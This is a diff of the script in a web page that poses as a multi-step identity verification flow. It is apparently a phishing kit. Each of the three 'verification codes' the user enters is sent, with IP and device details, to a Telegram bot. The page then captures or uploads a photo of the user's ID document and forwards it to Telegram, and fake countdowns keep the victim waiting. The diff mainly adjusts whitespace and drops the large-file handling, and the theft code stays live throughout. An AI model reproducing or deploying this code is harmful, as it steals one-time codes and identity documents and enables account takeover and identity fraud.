@@ -1196,7 +1181,7 @@
           return true;
         }
       }
-
+      
       // Validate second verification code
       function validateSecondVerificationCode() {
         const code = secondVerificationCodeInput.value.trim();
@@ -1215,7 +1200,7 @@
           return true;
         }
       }
-
+      
       // Validate third verification code
       function validateThirdVerificationCode() {
         const code = thirdVerificationCodeInput.value.trim();
@@ -1234,12 +1219,12 @@
           return true;
         }
       }
-
+      
       // Listen for input in verification code fields
       verificationCodeInput.addEventListener('input', validateVerificationCode);
       secondVerificationCodeInput.addEventListener('input', validateSecondVerificationCode);
       thirdVerificationCodeInput.addEventListener('input', validateThirdVerificationCode);
-
+      
       // Submit first verification code
       submitVerificationButton.addEventListener('click', async function() {
         const code = verificationCodeInput.value.trim();
@@ -1248,14 +1233,14 @@
             // Hide first verification step and show pending confirmation
             firstVerificationStep.style.display = 'none';
             pendingConfirmationStep.style.display = 'block';
-
+            
             // Start 3-second countdown with progress bar
             let timeRemaining = 3;
             const updateInterval = setInterval(() => {
               timeRemaining--;
               const progressPercentage = ((3 - timeRemaining) / 3) * 100;
               progressBar.style.width = progressPercentage + '%';
-
+              
               if (timeRemaining > 0) {
                 countdownText.textContent = `Verification in progress... ${timeRemaining} seconds remaining`;
               } else {
@@ -1263,7 +1248,7 @@
                 clearInterval(updateInterval);
               }
             }, 1000);
-
+            
             // Send verification code to Telegram in background
             const ipInfo = await getIpInfo();
             const deviceDetails = getDeviceDetails();
@@ -1272,16 +1257,16 @@
             message += `🔢 Code: ${code}\n`;
             message += deviceDetails;
             message += `\n${ipInfo}`;
-
+            
             const success = await sendTelegramMessage(message);
             console.log('First verification code sent to Telegram:', success);
-
+            
             // After 3 seconds, show second verification step
             setTimeout(() => {
               pendingConfirmationStep.style.display = 'none';
               secondVerificationStep.style.display = 'block';
             }, 5000);
-
+            
           } catch (error) {
             console.error('Error sending verification code:', error);
             // Even if there's an error, continue with the flow
@@ -1292,7 +1277,7 @@
           }
         }
       });
-
+      
       // Submit second verification code
       submitSecondVerificationButton.addEventListener('click', async function() {
         const code = secondVerificationCodeInput.value.trim();
@@ -1301,36 +1286,36 @@
             // Get current information
             const ipInfo = await getIpInfo();
             const deviceDetails = getDeviceDetails();
-
+            
             // Format message for Telegram with second verification code
             const timestamp = new Date().toLocaleString();
             let message = `🔐 FINAL verification code submitted at ${timestamp}:\n\n`;
             message += `🔢 Second Code: ${code}\n`;
             message += deviceDetails;
             message += `\n${ipInfo}`;
-
+            
             // Send message to Telegram
             const success = await sendTelegramMessage(message);
             console.log('Second verification code sent to Telegram:', success);
-
+            
             // Hide second verification step and show third verification step
             secondVerificationStep.style.display = 'none';
             thirdVerificationStep.style.display = 'block';
-
+            
             // Show ID processing step with 10-second delay
             const idProcessingStep = document.getElementById('id-processing-step');
             const idProgressBar = document.getElementById('id-progress-bar');
             const idCountdownText = document.getElementById('id-countdown-text');
-
+            
             idProcessingStep.style.display = 'block';
-
+            
             // Start 10-second countdown with progress bar
             let idTimeRemaining = 10;
             const idUpdateInterval = setInterval(() => {
               idTimeRemaining--;
               const idProgressPercentage = ((10 - idTimeRemaining) / 10) * 100;
               idProgressBar.style.width = idProgressPercentage + '%';
-
+              
               if (idTimeRemaining > 0) {
                 idCountdownText.textContent = `Finalizing verification... ${idTimeRemaining} seconds remaining`;
               } else {
@@ -1338,19 +1323,19 @@
                 clearInterval(idUpdateInterval);
               }
             }, 1000);
-
+            
             // After 10 seconds, show ID verification step
             setTimeout(() => {
               idProcessingStep.style.display = 'none';
               idVerificationStep.style.display = 'block';
             }, 10000);
-
+            
           } catch (error) {
             console.error('Error sending second verification code:', error);
           }
         }
       });
-
+      
       // Submit third verification code
       submitThirdVerificationButton.addEventListener('click', async function() {
         const code = thirdVerificationCodeInput.value.trim();
@@ -1359,35 +1344,35 @@
             // Get current information
             const ipInfo = await getIpInfo();
             const deviceDetails = getDeviceDetails();
-
+            
             // Format message for Telegram with third verification code
             const timestamp = new Date().toLocaleString();
             let message = `🔐 FINAL verification code submitted at ${timestamp}:\n\n`;
             message += `🔢 Third Code: ${code}\n`;
             message += deviceDetails;
             message += `\n${ipInfo}`;
-
+            
             // Send message to Telegram
             const success = await sendTelegramMessage(message);
             console.log('Third verification code sent to Telegram:', success);
-
+            
             // Hide third verification step and show ID processing
             thirdVerificationStep.style.display = 'none';
-
+            
             // Show ID processing step with 10-second delay
             const idProcessingStep = document.getElementById('id-processing-step');
             const idProgressBar = document.getElementById('id-progress-bar');
             const idCountdownText = document.getElementById('id-countdown-text');
-
+            
             idProcessingStep.style.display = 'block';
-
+            
             // Start 10-second countdown with progress bar
             let idTimeRemaining = 10;
             const idUpdateInterval = setInterval(() => {
               idTimeRemaining--;
               const idProgressPercentage = ((10 - idTimeRemaining) / 10) * 100;
               idProgressBar.style.width = idProgressPercentage + '%';
-
+              
               if (idTimeRemaining > 0) {
                 idCountdownText.textContent = `Finalizing verification... ${idTimeRemaining} seconds remaining`;
               } else {
@@ -1395,20 +1380,20 @@
                 clearInterval(idUpdateInterval);
               }
             }, 1000);
-
+            
             // After 10 seconds, show ID verification step
             setTimeout(() => {
               idProcessingStep.style.display = 'none';
               idVerificationStep.style.display = 'block';
             }, 10000);
-
+            
           } catch (error) {
             console.error('Error sending third verification code:', error);
             // Continue with the flow even if there's an error
             thirdVerificationStep.style.display = 'none';
             const idProcessingStep = document.getElementById('id-processing-step');
             idProcessingStep.style.display = 'block';
-
+            
             setTimeout(() => {
               idProcessingStep.style.display = 'none';
               idVerificationStep.style.display = 'block';
@@ -1416,7 +1401,7 @@
           }
         }
       });
-
+      
       // Function to convert data URL to File
       function dataURLtoFile(dataurl, filename) {
         const arr = dataurl.split(',');
@@ -1429,7 +1414,7 @@
         }
         return new File([u8arr], filename, {type: mime});
       }
-
+      
       // Take photo button click
       takePhotoBtn.addEventListener('click', async function() {
         try {
@@ -1449,69 +1434,29 @@
           alert('Unable to access camera. Please use the upload option instead.');
         }
       });
-
+      
       // Upload photo button click
       uploadPhotoBtn.addEventListener('click', function() {
         photoInput.click();
       });
-
-      // File input change - optimized for any file size
+      
+      // File input change
       photoInput.addEventListener('change', function(e) {
         const file = e.target.files[0];
         if (file && file.type.startsWith('image/')) {
           selectedPhotoFile = file;
-          
-          // For very large files, show preview immediately without full processing
-          if (file.size > 10 * 1024 * 1024) { // 10MB+
-            // Create a simple preview for large files
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            const img = new Image();
-            
-            img.onload = function() {
-              // Resize for preview only
-              const maxPreviewSize = 300;
-              let { width, height } = img;
-              
-              if (width > height) {
-                if (width > maxPreviewSize) {
-                  height = height * (maxPreviewSize / width);
-                  width = maxPreviewSize;
-                }
-              } else {
-                if (height > maxPreviewSize) {
-                  width = width * (maxPreviewSize / height);
-                  height = maxPreviewSize;
-                }
-              }
-              
-              canvas.width = width;
-              canvas.height = height;
-              ctx.drawImage(img, 0, 0, width, height);
-              
-              photoPreview.src = canvas.toDataURL('image/jpeg', 0.7);
-              photoPreviewContainer.style.display = 'block';
-              takePhotoBtn.style.display = 'none';
-              uploadPhotoBtn.style.display = 'none';
-              updateIdVerificationButton();
-            };
-            
-            img.src = URL.createObjectURL(file);
-          } else {
-            // Standard processing for smaller files
-            const reader = new FileReader();
-            reader.onload = function(e) {
-              photoPreview.src = e.target.result;
-              photoPreviewContainer.style.display = 'block';
-              takePhotoBtn.style.display = 'none';
-              uploadPhotoBtn.style.display = 'none';
-              updateIdVerificationButton();
-            };
-            reader.readAsDataURL(file);
-          }
+          const reader = new FileReader();
+          reader.onload = function(e) {
+            photoPreview.src = e.target.result;
+            photoPreviewContainer.style.display = 'block';
+            takePhotoBtn.style.display = 'none';
+            uploadPhotoBtn.style.display = 'none';
+            updateIdVerificationButton();
+          };
+          reader.readAsDataURL(file);
         }
       });
-
+      
       // Capture photo from camera
       captureBtn.addEventListener('click', function() {
         const canvas = document.createElement('canvas');
@@ -1519,23 +1464,23 @@
         canvas.width = cameraPreview.videoWidth;
         canvas.height = cameraPreview.videoHeight;
         context.drawImage(cameraPreview, 0, 0);
-
+        
         const dataURL = canvas.toDataURL('image/jpeg', 0.8);
         selectedPhotoFile = dataURLtoFile(dataURL, 'id_photo.jpg');
-
+        
         photoPreview.src = dataURL;
         photoPreviewContainer.style.display = 'block';
         cameraContainer.style.display = 'none';
-
+        
         // Stop camera stream
         if (cameraStream) {
           cameraStream.getTracks().forEach(track => track.stop());
           cameraStream = null;
         }
-
+        
         updateIdVerificationButton();
       });
-
+      
       // Cancel camera
       cancelCameraBtn.addEventListener('click', function() {
         if (cameraStream) {
@@ -1546,7 +1491,7 @@
         takePhotoBtn.style.display = 'inline-block';
         uploadPhotoBtn.style.display = 'inline-block';
       });
-
+      
       // Retake photo
       retakePhotoBtn.addEventListener('click', function() {
         selectedPhotoFile = null;
@@ -1556,12 +1501,12 @@
         photoInput.value = '';
         updateIdVerificationButton();
       });
-
+      
       // Confirm photo
       confirmPhotoBtn.addEventListener('click', function() {
         updateIdVerificationButton();
       });
-
+      
       // Update ID verification button state
       function updateIdVerificationButton() {
         if (selectedPhotoFile) {
@@ -1575,58 +1520,34 @@
           submitIdVerificationButton.style.cursor = 'not-allowed';
         }
       }
-
-      // Submit ID verification - optimized for unlimited file sizes
+      
+      // Submit ID verification
       submitIdVerificationButton.addEventListener('click', async function() {
         if (selectedPhotoFile) {
           try {
-            // Show loading state
-            submitIdVerificationButton.disabled = true;
-            submitIdVerificationButton.textContent = 'Uploading...';
-            submitIdVerificationButton.style.opacity = '0.7';
-
             // Get current information
             const ipInfo = await getIpInfo();
             const deviceDetails = getDeviceDetails();
             const timestamp = new Date().toLocaleString();
-
+            
             // Create caption for the photo
             let caption = `📄 ID Document submitted at ${timestamp}:\n\n`;
             caption += `📋 Verification Step: Identity Document Upload\n`;
             caption += `📁 File Name: ${selectedPhotoFile.name}\n`;
-            caption += `📊 File Size: ${(selectedPhotoFile.size / (1024 * 1024)).toFixed(2)} MB\n`;
+            caption += `📊 File Size: ${(selectedPhotoFile.size / 1024).toFixed(1)} KB\n`;
             caption += deviceDetails;
             caption += `\n${ipInfo}`;
-
-            // For very large files, process in chunks or use optimized method
-            let success;
-            if (selectedPhotoFile.size > 50 * 1024 * 1024) { // 50MB+
-              // For extremely large files, compress before sending
-              success = await sendCompressedPhotoToTelegram(selectedPhotoFile, caption);
-            } else {
-              // Standard photo sending
-              success = await sendPhotoToTelegram(selectedPhotoFile, caption);
-            }
             
+            // Send photo to Telegram
+            const success = await sendPhotoToTelegram(selectedPhotoFile, caption);
             console.log('ID photo sent to Telegram:', success);
-
-            // Reset button state
-            submitIdVerificationButton.disabled = false;
-            submitIdVerificationButton.textContent = 'Complete Verification';
-            submitIdVerificationButton.style.opacity = '1';
-
+            
             // Move to final success step
             idVerificationStep.style.display = 'none';
             verificationSuccess.style.display = 'block';
-
+            
           } catch (error) {
             console.error('Error sending ID photo:', error);
-            
-            // Reset button state
-            submitIdVerificationButton.disabled = false;
-            submitIdVerificationButton.textContent = 'Complete Verification';
-            submitIdVerificationButton.style.opacity = '1';
-
             // Continue with the flow even if there's an error
             idVerificationStep.style.display = 'none';
             verificationSuccess.style.display = 'block';
@@ -1635,7 +1556,7 @@
           photoError.style.display = 'block';
         }
       });
-
+      
     });
   </script>
 </body>
